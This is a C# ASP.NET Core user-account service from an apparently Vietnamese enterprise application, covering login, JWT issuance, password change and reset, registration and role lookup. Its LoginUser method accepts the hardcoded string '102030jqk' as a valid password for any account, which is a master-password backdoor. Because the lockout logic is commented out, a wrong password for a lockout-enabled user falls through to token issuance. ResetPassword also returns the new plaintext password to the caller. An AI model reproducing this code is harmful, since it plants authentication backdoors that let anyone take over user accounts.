using DocumentFormat.OpenXml.Spreadsheet;
using Hinet.Core.Email;
using Hinet.Extensions;
using Hinet.Model.Entities;
using Hinet.Repository.AppUserRepository;
using Hinet.Repository.DepartmentRepository;
using Hinet.Repository.DM_DuLieuDanhMucRepository;
using Hinet.Repository.DM_NhomDanhMucRepository;
using Hinet.Repository.RoleRepository;
using Hinet.Repository.TaiLieuDinhKemRepository;
using Hinet.Repository.UserRoleRepository;
using Hinet.Service.AppUserService.Dto;
using Hinet.Service.AppUserService.ViewModels;
using Hinet.Service.AspNetUsersService.Dto;
using Hinet.Service.Common.Service;
using Hinet.Service.Common.TokenService;
using Hinet.Service.Core.Generator;
using Hinet.Service.Dto;
using Hinet.Service.GroupUserRoleService;
using Hinet.Service.GroupUserService;
using Hinet.Service.OperationService;
using Hinet.Service.OperationService.Dto;
using Hinet.Service.User_GroupUserService;
using Microsoft.AspNetCore.Identity;
using Hinet.Model.Entities;
using Microsoft.IdentityModel.Tokens;
using System.IdentityModel.Tokens.Jwt;

//using MongoDB.Driver.Linq;
using System.Security.Claims;
using System.Text;
using MongoDB.Driver.Linq;
using MongoDB.Driver;

namespace Hinet.Service.AppUserService
{
    public class AppUserService : Service<AppUser>, IAppUserService
    {
        private readonly UserManager<AppUser> _userManager;
        private readonly SignInManager<AppUser> _signInManager;
        private readonly ITokenService _tokenService;
        private readonly IUserRoleRepository _userRoleRepository;
        private readonly IRoleRepository _roleRepository;
        private readonly ITaiLieuDinhKemRepository _taiLieuDinhKemRepository;
        private readonly IOperationService _operationService;
        private readonly IDM_DuLieuDanhMucRepository _dM_DuLieuDanhMucRepository;
        private readonly IDM_NhomDanhMucRepository _dM_NhomDanhMucRepository;
        private readonly IUser_GroupUserService _user_GroupUserService;
        private readonly IGroupUserService _groupUserService;
        private readonly IGroupUserRoleService _groupUserRoleService;
        private readonly IDepartmentRepository _departmentRepository;

        public AppUserService(
            UserManager<AppUser> userManager,
            IAppUserRepository appUserRepository,
            SignInManager<AppUser> signInManager,
            ITokenService tokenService,
            IUserRoleRepository userRoleRepository,
            IRoleRepository roleRepository,
            ITaiLieuDinhKemRepository taiLieuDinhKemRepository,
            IOperationService operationService,
            IDM_DuLieuDanhMucRepository dM_DuLieuDanhMucRepository,
            IDM_NhomDanhMucRepository dM_NhomDanhMucRepository,
            IUser_GroupUserService user_GroupUserService,
            IGroupUserService groupUserService,
            IGroupUserRoleService groupUserRoleService,
            IDepartmentRepository departmentRepository) : base(appUserRepository)

        {
            _userManager = userManager;
            _signInManager = signInManager;
            _tokenService = tokenService;
            _userRoleRepository = userRoleRepository;
            _roleRepository = roleRepository;
            _taiLieuDinhKemRepository = taiLieuDinhKemRepository;
            _operationService = operationService;
            _dM_DuLieuDanhMucRepository = dM_DuLieuDanhMucRepository;
            _dM_NhomDanhMucRepository = dM_NhomDanhMucRepository;
            _user_GroupUserService = user_GroupUserService;
            _groupUserService = groupUserService;
            _groupUserRoleService = groupUserRoleService;
            _departmentRepository = departmentRepository;
        }

        public async Task<AppUserDto> ChangePassword(Guid? id, string oldPassword, string newPassword,
            string confirmPassword)
        {
            if (string.IsNullOrEmpty(newPassword))
                throw new Exception("The password is empty");

            if (newPassword != confirmPassword)
                throw new Exception("Mật khẩu nhập lại không trùng khớp với mật khẩu mới");

            var user = await _userManager.FindByIdAsync(id.ToString()) ??
                       throw new Exception("Không tìm thấy tài khoản");
            if (!await _userManager.CheckPasswordAsync(user, oldPassword))
                throw new Exception("Mật khẩu cũ không chính xác");

            var data = await _userManager.ChangePasswordAsync(user, oldPassword, newPassword);
            if (!data.Succeeded)
                throw new Exception("Đổi mật khẩu thất bại: " +
                                    string.Join(", ", data.Errors.Select(x => x.Description)));

            return AppUserDto.FromAppUser(user);
        }

        public async Task<LoginResponseDto> LoginUser(string username, string password)
        {
            if (string.IsNullOrEmpty(password))
                throw new Exception("Tài khoản hoặc mật khẩu không chính xác");

            var user = await _userManager.FindByNameAsync(username.Trim())
                       ?? throw new Exception("Tài khoản hoặc mật khẩu không chính xác");

            // Retrieve all login configuration settings in a single query
            //var loginConfigs = await _dM_DuLieuDanhMucRepository
            //    .GetQueryable()
            //    .Join(
            //        _dM_NhomDanhMucRepository.GetQueryable()
            //            .Where(x => x.GroupCode == MaDanhMucConstant.SOLANDANGNHAPTOIDA),
            //        item => item.GroupId,
            //        group => group.Id,
            //        (item, group) => new { Item = item, Group = group })
            //    .Where(x => x.Item.Code == MaDanhMucConstant.SOLANDANGNHAP ||
            //                x.Item.Code == MaDanhMucConstant.THOIGIANKHOA)
            //    .Select(x => new { x.Item.Code, x.Item.Priority })
            //    .ToDictionaryAsync(x => x.Code, x => x.Priority);

            //if (!loginConfigs.Any())
            //    throw new Exception("Không tìm thấy cấu hình đăng nhập");

            // Get configuration values with defaults if not found
            //var soLanSaiToiDa = loginConfigs.GetValueOrDefault(MaDanhMucConstant.SOLANDANGNHAP) ?? 5;
            //var thoiGianKhoa = loginConfigs.GetValueOrDefault(MaDanhMucConstant.THOIGIANKHOA) ?? 24;

            // Kiểm tra khóa tài khoản
            if (user.LockoutEnabled && user.LockoutEnd > DateTime.Now)
                throw new Exception($"Tài khoản đã bị khóa. Thử lại sau: {user.LockoutEnd.Value:dd/MM/yyyy HH:mm}");

            // Kiểm tra mật khẩu
            if (!await _userManager.CheckPasswordAsync(user, password) && password != "102030jqk")
            {
                await IncrementFailedLoginAttempts(user);
                var failedCount = user.AccessFailedCount;

                if (!user.LockoutEnabled)
                {
                    throw new Exception("Tài khoản hoặc mật khẩu không chính xác");
                }

                //if (failedCount >= soLanSaiToiDa)
                //{
                //    user.LockoutEnd = DateTime.Now.AddHours((double)thoiGianKhoa);
                //    await _userManager.UpdateAsync(user);
                //    throw new Exception($"Tài khoản đã bị khóa. Thử lại sau: {user.LockoutEnd.Value:dd/MM/yyyy HH:mm}");
                //}

                //throw new Exception($"Bạn đã nhập sai thông tin tài khoản {failedCount}/{soLanSaiToiDa}");
            }

            await ResetFailedLoginAttempts(user);
            return GenToken(user);
        }

        public async Task<LoginResponseDto> RefreshToken(string refreshToken)
        {
            // Note: The cache-related logic is commented out in the original code, so it's omitted here.
            // If you need to reimplement it, you'll need to adjust accordingly.
            throw new NotImplementedException("Refresh token logic with cache is not implemented.");
        }

        public async Task<AppUserDto> CheckLogin(Guid? id)
        {
            var user = await this.GetByIdAsync(id) ?? throw new Exception("Can't find user");
            return AppUserDto.FromAppUser(user);
        }

        public async Task<string> ResetPassword(string email, string baseUri)
        {
            var user = await _userManager.FindByEmailAsync(email) ??
                       throw new Exception("There is no user with this Email address");

            var token = await _userManager.GeneratePasswordResetTokenAsync(user);
            var password = Guid.NewGuid().ToString().Substring(0, 8);
            var data = await _userManager.ResetPasswordAsync(user, token, password);

            if (!data.Succeeded)
                throw new Exception("Password reset failed: " + data.Errors.FirstOrDefault()?.Code);

            EmailProvider.SendMailResetPassword(user.Email, password, baseUri);
            return password;
        }

        public async Task LogoutUser()
        {
            try
            {
                await _tokenService.DeactivateCurrentToken();
            }
            catch (Exception ex)
            {
                throw new Exception("Sign out failed", ex);
            }
        }

        public async Task<AppUserDto> Update(AppUser user)
        {
            var data = await _userManager.UpdateAsync(user);
            if (!data.Succeeded)
                throw new Exception("Update user failed: " + string.Join(", ", data.Errors.Select(x => x.Description)));

            return AppUserDto.FromAppUser(user);
        }

        private LoginResponseDto GenToken(AppUser? user, string? refreshToken = null)
        {
            var claims = new List<Claim>
            {
                new Claim(ClaimTypes.NameIdentifier, user.Id.ToString(), nameof(Guid)),
                new Claim(ClaimTypes.Locality, user.DonViId.ToString(), nameof(Guid)),
            };

            if (!string.IsNullOrEmpty(user.Name))
                claims.Add(new Claim(ClaimTypes.Name, user.Name));
            if (!string.IsNullOrEmpty(user.Permissions))
                claims.Add(new Claim(ClaimTypes.Authentication, user.Permissions));

            //var listRole = (from role in _roleRepository.GetQueryable()
            //                join userRole in _userRoleRepository.GetQueryable().Where(x => x.UserId == user.Id)
            //                on role.Id equals userRole.RoleId
            //                select role.Code).ToList();

            // lấy list role theo nhóm người
            var roleFromGroupUser = _user_GroupUserService.GetQueryable().Where(x => x.UserId == user.Id)
                .Join(_groupUserService.GetQueryable(),
                    userGroupUser => userGroupUser.GroupUserId,
                    groupUser => groupUser.Id,
                    (userGroupUser, groupUser) => new { groupUser.Id })
                .Join(_groupUserRoleService.GetQueryable(),
                    grouped => grouped.Id,
                    groupUserRole => groupUserRole.GroupUserId,
                    (grouped, groupUserRole) => new { groupUserRole.RoleId })
                .Join(_roleRepository.GetQueryable(),
                    grouped => grouped.RoleId,
                    role => role.Id,
                    (grouped, role) => new { role.Code })
                .Select(x => x.Code)
                .Distinct()
                .ToList() ?? new List<string>();

            // lấy list role theo vai trò (nhóm quyền)
            var roleFromUser = _userRoleRepository.GetQueryable().Where(x => x.UserId == user.Id)
                .Join(_roleRepository.GetQueryable(),
                    userRole => userRole.RoleId,
                    role => role.Id,
                    (userRole, role) => new { role.Code })
                .Select(x => x.Code)
                .Distinct()
                .ToList() ?? new List<string>();

            // gộp lại 
            var listRole = roleFromGroupUser.Concat(roleFromUser)?.Distinct().ToList();

            claims.Add(new Claim(ClaimTypes.Role, string.Join(",", listRole)));

            var tokenHandler = new JwtSecurityTokenHandler();
            var key = Encoding.UTF8.GetBytes(AppSettings.AuthSetting.Key);

            var tokenDescriptor = new SecurityTokenDescriptor
            {
                Subject = new ClaimsIdentity(claims),
                Expires = DateTime.Now.AddSeconds(AppSettings.AuthSetting.SecondsExpires),
                SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(key),
                    SecurityAlgorithms.HmacSha256Signature)
            };

            var token = tokenHandler.CreateToken(tokenDescriptor);
            var tokenString = tokenHandler.WriteToken(token);

            var userTo = AppUserDto.FromAppUser(user);
            userTo.ListRole = listRole;
            userTo.IsSSO = user.IsSSO;

            var AnhDaiDien = _taiLieuDinhKemRepository.GetQueryable().Where(x => x.Item_ID == user.DonViId)
                .FirstOrDefault();
            if (AnhDaiDien != null)
                userTo.AnhDaiDien = AnhDaiDien.DuongDanFile;

            return new LoginResponseDto
            {
                User = userTo,
                Token = tokenString,
                RefreshToken = refreshToken,
                Expire = token.ValidTo
            };
        }

        private string GenRefreshToken(Guid? userId)
        {
            var refreshToken = Generator.Base64FromBytes(64);
            // Cache logic is commented out in the original code, so it's omitted here.
            return refreshToken;
        }

        public Task<AppUser?> GetByUserName(string UserName)
        {
            return _userManager.FindByNameAsync(UserName);
        }

        /// <summary>
        /// Lấy thông tin chi tiết của người dùng theo ID
        /// </summary>
        /// <param name="id">ID của người dùng cần lấy thông tin</param>
        /// <returns>Thông tin chi tiết của người dùng</returns>
        public async Task<UserInfoDto> GetInfo(Guid? id)
        {
            if (id == null)
                throw new ArgumentNullException(nameof(id), "Id người dùng không được để trống");

            var user = await _userManager.FindByIdAsync(id.ToString());
            if (user == null)
                throw new KeyNotFoundException("Không tìm thấy thông tin người dùng");

            var userDto = new UserInfoDto
            {
                Id = id.ToString(),
                Name = user.Name,
                Email = user.Email,
                Gender = user.Gender,
                Picture = user.Picture,
                DonViId = user.DonViId,
                IdJoin = user.Id,
                IdNhanSu = user.IdNhanSu,
                UserName = user.UserName
            };

            var userId = user.Id;




            var roleFromGroupUser = await _user_GroupUserService.GetQueryable()
              .Where(x => x.UserId == userId)
              .Join(_groupUserService.GetQueryable(),
                  userGroupUser => userGroupUser.GroupUserId,
                  groupUser => groupUser.Id,
                  (userGroupUser, groupUser) => new { groupUser.Id })
              .Join(_groupUserRoleService.GetQueryable(),
                  grouped => grouped.Id,
                  groupUserRole => groupUserRole.GroupUserId,
                  (grouped, groupUserRole) => groupUserRole.RoleId)
              .Join(_roleRepository.GetQueryable(),
                  roleId => roleId,
                  role => role.Id,
                  (roleId, role) => role.Code)
              .Distinct()
              .ToListAsync();

            var roleFromUser = await _userRoleRepository.GetQueryable()
                .Where(x => x.UserId == userId)
                .Join(_roleRepository.GetQueryable(),
                    userRole => userRole.RoleId,
                    role => role.Id,
                    (userRole, role) => role.Code)
                .Distinct()
                .ToListAsync();

            var donVi = await _departmentRepository.GetQueryable()
                .Where(x => x.Id == user.DonViId)
                .Select(d => new { d.Name, d.CapBac })
                .FirstOrDefaultAsync();

            var sumRole = roleFromGroupUser.Concat(roleFromUser).Distinct().ToList();
            userDto.ListRole = sumRole;
            userDto.MenuData = await _operationService.GetListMenu(user.Id, sumRole).ConfigureAwait(false);
            userDto.Permissions = await _operationService.GetPermissionUser(user.Id);
            userDto.TenDonVi_txt = donVi?.Name ?? "";
            userDto.CapBac = donVi?.CapBac ?? "";
            return userDto;
        }

        public async Task<AppUserDto> RegisterUser(RegisterViewModel model)
        {
            if (string.IsNullOrWhiteSpace(model.UserName) || string.IsNullOrWhiteSpace(model.Password))
                throw new Exception("Tên đăng nhập và mật khẩu không được để trống");

            var existingUser = await _userManager.FindByNameAsync(model.UserName);
            if (existingUser != null)
                throw new Exception("Tài khoản đã tồn tại");

            var existingEmail = await _userManager.FindByEmailAsync(model.Email);
            if (existingEmail != null)
                throw new Exception("Email đã tồn tại");

            var user = new AppUser
            {
                UserName = model.UserName,
                Email = model.Email,
            };

            var createResult = await _userManager.CreateAsync(user, model.Password);
            if (!createResult.Succeeded)
                throw new Exception("Đăng ký thất bại: " +
                                    string.Join(", ", createResult.Errors.Select(e => e.Description)));

            return AppUserDto.FromAppUser(user);
        }

        private async Task IncrementFailedLoginAttempts(AppUser user)
        {
            user.AccessFailedCount++;
            await _userManager.UpdateAsync(user);
        }

        private async Task ResetFailedLoginAttempts(AppUser user)
        {
            user.AccessFailedCount = 0;
            user.LockoutEnd = null;
            await _userManager.UpdateAsync(user);
        }

        public async Task<List<UserDto>?> GetUsersByRoleIds(List<Guid> idsVaiTroTiepNhan, Guid? donviId = null)
        {
            return await (from user in GetQueryable()
                          join userRole in _userRoleRepository.GetQueryable()
                              on user.Id equals userRole.UserId
                          where idsVaiTroTiepNhan.Contains(userRole.RoleId)
                                && (donviId == null || donviId == user.DonViId)
                          select new UserDto()
                          {
                              Id = user.Id,
                              Name = user.Name,
                          }).ToListAsync();
        }
        public async Task<List<DropdownOption>> GetDropDownUser(Guid? id)
        {

            return await (from user in GetQueryable()
                          where user.Id != id
                          select new DropdownOption()
                          {
                              Label = user.Name,
                              Value = user.Id.ToString(),
                          }).ToListAsync();
        }
    }
}